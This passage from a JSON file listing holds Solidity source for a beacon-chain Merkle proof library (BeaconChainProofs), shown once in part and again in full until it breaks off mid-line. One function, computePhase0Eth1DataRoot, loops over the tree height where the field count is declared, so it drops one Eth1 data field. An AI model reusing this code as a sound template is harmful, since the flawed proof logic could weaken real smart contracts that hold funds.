(VALIDATOR_TREE_HEIGHT + 1)) | uint256(validatorIndex);\n        // merkleize the validatorFields to get the leaf to prove\n        bytes32 validatorRoot = Merkle.merkleizeSha256(validatorFields);\n\n        // verify the proof of the validatorRoot against the beaconStateRoot\n        require(Merkle.verifyInclusionSha256(proof, beaconStateRoot, validatorRoot, index), \"BeaconChainProofs.verifyValidatorFields: Invalid merkle proof\");\n    }\n\n    /**\n     * @notice This function verifies merkle proofs of the balance of a certain validator against a beacon chain state root\n     * @param validatorIndex the index of the proven validator\n     * @param beaconStateRoot is the beacon chain state root to be proven against.\n     * @param proof is the proof of the balance against the beacon chain state root\n     * @param balanceRoot is the serialized balance used to prove the balance of the validator (refer to `getBalanceFromBalanceRoot` above for detailed explanation)\n     */\n    function verifyValidatorBalance(\n        uint40 validatorIndex,\n        bytes32 beaconStateRoot,\n        bytes calldata proof,\n        bytes32 balanceRoot\n    ) internal view {\n        require(proof.length == 32 * ((BALANCE_TREE_HEIGHT + 1) + BEACON_STATE_FIELD_TREE_HEIGHT), \"BeaconChainProofs.verifyValidatorBalance: Proof has incorrect length\");\n\n        /**\n        * the beacon state's balance list is a list of uint64 values, and these are grouped together in 4s when merkleized.  \n        * Therefore, the index of the balance of a validator is validatorIndex/4\n        */\n        uint256 balanceIndex = uint256(validatorIndex/4);\n        balanceIndex = (BALANCE_INDEX << (BALANCE_TREE_HEIGHT + 1)) | balanceIndex;\n\n        require(Merkle.verifyInclusionSha256(proof, beaconStateRoot, balanceRoot, balanceIndex), \"BeaconChainProofs.verifyValidatorBalance: Invalid merkle proof\");\n    }\n\n    /**\n     * @notice This function verifies the slot and the withdrawal fields for a given withdrawal\n     * @param beaconStateRoot is the beacon chain state root to be proven against.\n     * @param proofs is the provided set of merkle proofs\n     * @param withdrawalFields is the serialized withdrawal container to be proven\n     */\n    function verifyWithdrawalProofs(\n        bytes32 beaconStateRoot,\n        WithdrawalProofs calldata proofs,\n        bytes32[] calldata withdrawalFields\n    ) internal view {\n        require(withdrawalFields.length == 2**WITHDRAWAL_FIELD_TREE_HEIGHT, \"BeaconChainProofs.verifyWithdrawalProofs: withdrawalFields has incorrect length\");\n\n        require(proofs.blockHeaderRootIndex < 2**BLOCK_ROOTS_TREE_HEIGHT, \"BeaconChainProofs.verifyWithdrawalProofs: blockRootIndex is too large\");\n        require(proofs.withdrawalIndex < 2**WITHDRAWALS_TREE_HEIGHT, \"BeaconChainProofs.verifyWithdrawalProofs: withdrawalIndex is too large\");\n       \n        // verify the block header proof length\n        require(proofs.blockHeaderProof.length == 32 * (BEACON_STATE_FIELD_TREE_HEIGHT + BLOCK_ROOTS_TREE_HEIGHT),\n            \"BeaconChainProofs.verifyWithdrawalProofs: blockHeaderProof has incorrect length\");\n        require(proofs.withdrawalProof.length == 32 * (EXECUTION_PAYLOAD_HEADER_FIELD_TREE_HEIGHT + WITHDRAWALS_TREE_HEIGHT + 1),\n            \"BeaconChainProofs.verifyWithdrawalProofs: withdrawalProof has incorrect length\");\n        require(proofs.executionPayloadProof.length == 32 * (BEACON_BLOCK_HEADER_FIELD_TREE_HEIGHT + BEACON_BLOCK_BODY_FIELD_TREE_HEIGHT),\n            \"BeaconChainProofs.verifyWithdrawalProofs: executionPayloadProof has incorrect length\");\n\n        /**\n         * Computes the block_header_index relative to the beaconStateRoot.  It concatenates the indexes of all the\n         * intermediate root indexes from the bottom of the sub trees (the block header container) to the top of the tree\n         */\n        uint256 blockHeaderIndex = BLOCK_ROOTS_INDEX << (BLOCK_ROOTS_TREE_HEIGHT)  | uint256(proofs.blockHeaderRootIndex);\n        // Verify the blockHeaderRoot against the beaconStateRoot\n        require(Merkle.verifyInclusionSha256(proofs.blockHeaderProof, beaconStateRoot, proofs.blockHeaderRoot, blockHeaderIndex),\n            \"BeaconChainProofs.verifyWithdrawalProofs: Invalid block header merkle proof\");\n\n        //Next we verify the slot against the blockHeaderRoot\n        require(Merkle.verifyInclusionSha256(proofs.slotProof, proofs.blockHeaderRoot, proofs.slotRoot, SLOT_INDEX), \"BeaconChainProofs.verifyWithdrawalProofs: Invalid slot merkle proof\");\n\n        // Next we verify the executionPayloadRoot against the blockHeaderRoot\n        uint256 executionPayloadIndex = BODY_ROOT_INDEX << (BEACON_BLOCK_BODY_FIELD_TREE_HEIGHT)| EXECUTION_PAYLOAD_INDEX ;\n        require(Merkle.verifyInclusionSha256(proofs.executionPayloadProof, proofs.blockHeaderRoot, proofs.executionPayloadRoot, executionPayloadIndex),\n            \"BeaconChainProofs.verifyWithdrawalProofs: Invalid executionPayload merkle proof\");\n\n        // Next we verify the blockNumberRoot against the executionPayload root\n        require(Merkle.verifyInclusionSha256(proofs.blockNumberProof, proofs.executionPayloadRoot, proofs.blockNumberRoot, BLOCK_NUMBER_INDEX),\n            \"BeaconChainProofs.verifyWithdrawalProofs: Invalid blockNumber merkle proof\");\n\n        /**\n         * Next we verify the withdrawal fields against the blockHeaderRoot:\n         * First we compute the withdrawal_index relative to the blockHeaderRoot by concatenating the indexes of all the \n         * intermediate root indexes from the bottom of the sub trees (the withdrawal container) to the top, the blockHeaderRoot.\n         * Then we calculate merkleize the withdrawalFields container to calculate the the withdrawalRoot.\n         * Finally we verify the withdrawalRoot against the executionPayloadRoot.\n         */\n        uint256 withdrawalIndex = WITHDRAWALS_INDEX << (WITHDRAWALS_TREE_HEIGHT + 1) | uint256(proofs.withdrawalIndex);\n        bytes32 withdrawalRoot = Merkle.merkleizeSha256(withdrawalFields);\n        require(Merkle.verifyInclusionSha256(proofs.withdrawalProof, proofs.executionPayloadRoot, withdrawalRoot, withdrawalIndex),\n            \"BeaconChainProofs.verifyWithdrawalProofs: Invalid withdrawal merkle proof\");\n    }\n\n}"
    },
    {
      "filename": "src/contracts/libraries/BeaconChainProofs.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\npragma solidity =0.8.12;\n\nimport \"./Merkle.sol\";\nimport \"../libraries/Endian.sol\";\n\n//Utility library for parsing and PHASE0 beacon chain block headers\n//SSZ Spec: https://github.com/ethereum/consensus-specs/blob/dev/ssz/simple-serialize.md#merkleization\n//BeaconBlockHeader Spec: https://github.com/ethereum/consensus-specs/blob/dev/specs/phase0/beacon-chain.md#beaconblockheader\n//BeaconState Spec: https://github.com/ethereum/consensus-specs/blob/dev/specs/phase0/beacon-chain.md#beaconstate\nlibrary BeaconChainProofs {\n    // constants are the number of fields and the heights of the different merkle trees used in merkleizing beacon chain containers\n    uint256 internal constant NUM_BEACON_BLOCK_HEADER_FIELDS = 5;\n    uint256 internal constant BEACON_BLOCK_HEADER_FIELD_TREE_HEIGHT = 3;\n\n    uint256 internal constant NUM_BEACON_BLOCK_BODY_FIELDS = 11;\n    uint256 internal constant BEACON_BLOCK_BODY_FIELD_TREE_HEIGHT = 4;\n\n    uint256 internal constant NUM_BEACON_STATE_FIELDS = 21;\n    uint256 internal constant BEACON_STATE_FIELD_TREE_HEIGHT = 5;\n\n    uint256 internal constant NUM_ETH1_DATA_FIELDS = 3;\n    uint256 internal constant ETH1_DATA_FIELD_TREE_HEIGHT = 2;\n\n    uint256 internal constant NUM_VALIDATOR_FIELDS = 8;\n    uint256 internal constant VALIDATOR_FIELD_TREE_HEIGHT = 3;\n\n    uint256 internal constant NUM_EXECUTION_PAYLOAD_HEADER_FIELDS = 15;\n    uint256 internal constant EXECUTION_PAYLOAD_HEADER_FIELD_TREE_HEIGHT = 4;\n\n\n    uint256 internal constant NUM_EXECUTION_PAYLOAD_FIELDS = 15;\n    uint256 internal constant EXECUTION_PAYLOAD_FIELD_TREE_HEIGHT = 4;\n\n\n    // HISTORICAL_ROOTS_LIMIT\t = 2**24, so tree height is 24\n    uint256 internal constant HISTORICAL_ROOTS_TREE_HEIGHT = 24;\n\n    // HISTORICAL_BATCH is root of state_roots and block_root, so number of leaves =  2^1\n    uint256 internal constant HISTORICAL_BATCH_TREE_HEIGHT = 1;\n\n    // SLOTS_PER_HISTORICAL_ROOT = 2**13, so tree height is 13\n    uint256 internal constant STATE_ROOTS_TREE_HEIGHT = 13;\n    uint256 internal constant BLOCK_ROOTS_TREE_HEIGHT = 13;\n\n\n    uint256 internal constant NUM_WITHDRAWAL_FIELDS = 4;\n    // tree height for hash tree of an individual withdrawal container\n    uint256 internal constant WITHDRAWAL_FIELD_TREE_HEIGHT = 2;\n\n    uint256 internal constant VALIDATOR_TREE_HEIGHT = 40;\n    //refer to the eigenlayer-cli proof library.  Despite being the same dimensions as the validator tree, the balance tree is merkleized differently\n    uint256 internal constant BALANCE_TREE_HEIGHT = 38;\n\n    // MAX_WITHDRAWALS_PER_PAYLOAD = 2**4, making tree height = 4\n    uint256 internal constant WITHDRAWALS_TREE_HEIGHT = 4;\n\n    //in beacon block body\n    uint256 internal constant EXECUTION_PAYLOAD_INDEX = 9;\n\n    // in beacon block header\n    uint256 internal constant STATE_ROOT_INDEX = 3;\n    uint256 internal constant PROPOSER_INDEX_INDEX = 1;\n    uint256 internal constant SLOT_INDEX = 0;\n    uint256 internal constant BODY_ROOT_INDEX = 4;\n    // in beacon state\n    uint256 internal constant STATE_ROOTS_INDEX = 6;\n    uint256 internal constant BLOCK_ROOTS_INDEX = 5;\n    uint256 internal constant HISTORICAL_ROOTS_INDEX = 7;\n    uint256 internal constant ETH_1_ROOT_INDEX = 8;\n    uint256 internal constant VALIDATOR_TREE_ROOT_INDEX = 11;\n    uint256 internal constant BALANCE_INDEX = 12;\n    uint256 internal constant EXECUTION_PAYLOAD_HEADER_INDEX = 24;\n    uint256 internal constant HISTORICAL_BATCH_STATE_ROOT_INDEX = 1;\n\n    // in validator\n    uint256 internal constant VALIDATOR_WITHDRAWAL_CREDENTIALS_INDEX = 1;\n    uint256 internal constant VALIDATOR_BALANCE_INDEX = 2;\n    uint256 internal constant VALIDATOR_SLASHED_INDEX = 3;\n    uint256 internal constant VALIDATOR_WITHDRAWABLE_EPOCH_INDEX = 7;\n    \n    // in exection payload header\n    uint256 internal constant BLOCK_NUMBER_INDEX = 6;\n    uint256 internal constant WITHDRAWALS_ROOT_INDEX = 14;\n\n    //in execution payload\n    uint256 internal constant WITHDRAWALS_INDEX = 14;\n\n    // in withdrawal\n    uint256 internal constant WITHDRAWAL_VALIDATOR_INDEX_INDEX = 1;\n    uint256 internal constant WITHDRAWAL_VALIDATOR_AMOUNT_INDEX = 3;\n\n    //In historicalBatch\n    uint256 internal constant HISTORICALBATCH_STATEROOTS_INDEX = 1;\n\n    //Misc Constants\n    uint256 internal constant SLOTS_PER_EPOCH = 32;\n\n    bytes8 internal constant UINT64_MASK = 0xffffffffffffffff;\n\n\n\n    struct WithdrawalProofs {\n        bytes blockHeaderProof;\n        bytes withdrawalProof;\n        bytes slotProof;\n        bytes executionPayloadProof;\n        bytes blockNumberProof;\n        uint64 blockHeaderRootIndex;\n        uint64 withdrawalIndex;\n        bytes32 blockHeaderRoot;\n        bytes32 blockBodyRoot;\n        bytes32 slotRoot;\n        bytes32 blockNumberRoot;\n        bytes32 executionPayloadRoot;\n    }\n\n    struct ValidatorFieldsAndBalanceProofs {\n        bytes validatorFieldsProof;\n        bytes validatorBalanceProof;\n        bytes32 balanceRoot;\n    }\n\n    struct ValidatorFieldsProof {\n        bytes validatorProof;\n        uint40 validatorIndex;\n    }\n\n    function computePhase0BeaconBlockHeaderRoot(bytes32[NUM_BEACON_BLOCK_HEADER_FIELDS] calldata blockHeaderFields) internal pure returns(bytes32) {\n        bytes32[] memory paddedHeaderFields = new bytes32[](2**BEACON_BLOCK_HEADER_FIELD_TREE_HEIGHT);\n        \n        for (uint256 i = 0; i < NUM_BEACON_BLOCK_HEADER_FIELDS; ++i) {\n            paddedHeaderFields[i] = blockHeaderFields[i];\n        }\n\n        return Merkle.merkleizeSha256(paddedHeaderFields);\n    }\n\n    function computePhase0BeaconStateRoot(bytes32[NUM_BEACON_STATE_FIELDS] calldata beaconStateFields) internal pure returns(bytes32) {\n        bytes32[] memory paddedBeaconStateFields = new bytes32[](2**BEACON_STATE_FIELD_TREE_HEIGHT);\n        \n        for (uint256 i = 0; i < NUM_BEACON_STATE_FIELDS; ++i) {\n            paddedBeaconStateFields[i] = beaconStateFields[i];\n        }\n        \n        return Merkle.merkleizeSha256(paddedBeaconStateFields);\n    }\n\n    function computePhase0ValidatorRoot(bytes32[NUM_VALIDATOR_FIELDS] calldata validatorFields) internal pure returns(bytes32) {  \n        bytes32[] memory paddedValidatorFields = new bytes32[](2**VALIDATOR_FIELD_TREE_HEIGHT);\n        \n        for (uint256 i = 0; i < NUM_VALIDATOR_FIELDS; ++i) {\n            paddedValidatorFields[i] = validatorFields[i];\n        }\n\n        return Merkle.merkleizeSha256(paddedValidatorFields);\n    }\n\n    function computePhase0Eth1DataRoot(bytes32[NUM_ETH1_DATA_FIELDS] calldata eth1DataFields) internal pure returns(bytes32) {  \n        bytes32[] memory paddedEth1DataFields = new bytes32[](2**ETH1_DATA_FIELD_TREE_HEIGHT);\n        \n        for (uint256 i = 0; i < ETH1_DATA_FIELD_TREE_HEIGHT; ++i) {\n            paddedEth1DataFields[i] = eth1DataFields[i];\n        }\n\n        return Merkle.merkleizeSha256(paddedEth1DataFields);\n    }\n\n    /**\n     * \n     * @notice This function is parses the balanceRoot to get the uint64 balance of a validator.  During merkleization of the\n     * beacon state balance tree, four uint64 values (making 32 bytes) are grouped together and treated as a single leaf in the merkle tree. Thus the\n     * validatorIndex mod 4 is used to determine which of the four uint64 values to extract from the balanceRoot.\n     * @param validatorIndex is the index of the validator being proven for.\n     * @param balanceRoot is the combination of 4 validator balances being proven for.\n     */\n   function getBalanceFromBalanceRoot(uint40 validatorIndex, bytes32 balanceRoot) internal pure returns (uint64) {\n        uint256 bitShiftAmount = (validatorIndex % 4) * 64;\n        bytes32 validatorBalanceLittleEndian = bytes32((uint256(balanceRoot) << bitShiftAmount));\n        uint64 validatorBalance = Endian.fromLittleEndianUint64(validatorBalanceLittleEndian);\n        return validatorBalance;\n    }\n\n    /**\n     * @notice This function verifies merkle proofs of the fields of a certain validator against a beacon chain state root\n     * @param validatorIndex the index of the proven validator\n     * @param beaconStateRoot is the beacon chain state root to be proven against.\n     * @param proof is the data used in proving the validator's fields\n     * @param validatorFields the claimed fields of the validator\n     */\n    function verifyValidatorFields(\n        uint40 validatorIndex,\n        bytes32 beaconStateRoot,\n        bytes calldata proof, \n        bytes32[] calldata validatorFields\n    ) internal view {\n        \n        require(validatorFields.length == 2**VALIDATOR_FIELD_TREE_HEIGHT, \"BeaconChainProofs.verifyValidatorFields: Validator fields has incorrect length\");\n\n        /**\n         * Note: the length of the validator merkle proof is BeaconChainProofs.VALIDATOR_TREE_HEIGHT + 1.\n         * There is an additional layer added by hashing the root with the length of the validator list\n         */\n        require(proof.length == 32 * ((VALIDATOR_TREE_HEIGHT + 1) + BEACON_STATE_FIELD_TREE_HEIGHT), \"BeaconChainProofs.verifyValidatorFields: Proof has incorrect length\");\n        uint256 index = (VALIDATOR_TREE_ROOT_INDEX << (VALIDATOR_TREE_HEIGHT + 1)) | uint256(validatorIndex);\n        // merkleize the validatorFields to get the leaf to prove\n        bytes32 validatorRoot = Merkle.merkleizeSha256(validatorFields);\n\n        // verify the proof of the validatorRoot against the beaconStateRoot\n        require(Merkle.verifyInclusionSha256(proof, beaconStateRoot, validatorRoot, index), \"BeaconChainProofs.verifyValidatorFields: Invalid merkle proof\");\n    }\n\n    /**\n     * @notice This function verifies merkle proofs of the balance of a certain validator against a beacon chain state root\n     * @param validatorIndex the index of the proven validator\n     * @param beaconStateRoot is the beacon chain state root to be proven against.\n     * @param proof is the proof of the balance against the beacon chain state root\n     * @param balanceRoot is the serialized balance used to prove the balance of the validator (refer to `getBalanceFromBalanceRoot` above for detailed explanation)\n     */\n    function verifyValidatorBalance(\n        uint40 validatorIndex,\n        bytes32 beaconStateRoot,\n        bytes calldata proof,\n        bytes32 balanceRoot\n    ) internal view {\n        require(proof.length == 32 * ((BALANCE_TREE_HEIGHT + 1) + BEACON_STATE_FIELD_TREE_HEIGHT), \"BeaconChainProofs.verifyValidatorBalance: Proof has incorrect length\");\n\n        /**\n        * the beacon state's balance list is a list of uint64 values, and these are grouped together in 4s when merkleized.  \n        * Therefore, the index of the balance of a validator is validatorIndex/4\n        */\n        uint256 balanceIndex = uint25"
    }
  ]
}